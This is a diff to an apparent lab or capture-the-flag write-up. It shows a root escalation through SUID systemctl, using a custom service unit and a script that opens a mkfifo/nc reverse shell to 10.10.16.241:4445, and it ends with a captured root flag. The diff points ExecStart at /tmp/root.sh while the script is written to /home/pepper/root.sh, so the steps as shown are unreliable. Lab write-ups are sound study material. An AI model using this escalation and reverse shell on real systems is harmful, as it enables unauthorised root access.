@@ -154,7 +154,7 @@ GTfo bins exploit suggestion for suid enabled systemctl
 ```
 echo '[Service]
 Type=oneshot
-ExecStart=/home/pepper/root.sh
+ExecStart=/tmp/root.sh
 [Install]
 WantedBy=multi-user.target' >/home/pepper/root.service
 
@@ -165,4 +165,12 @@ systemctl enable --now /home/pepper/root.service
 ```
 echo -e '#!/bin/bash\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.241 4445 >/tmp/f' > /home/pepper/root.sh
 
+```
+
+
+Finally got the root shell
+
+```
+# cat root.txt
+644a2e4c9a0a897f2d33866e46f33bea
 ```
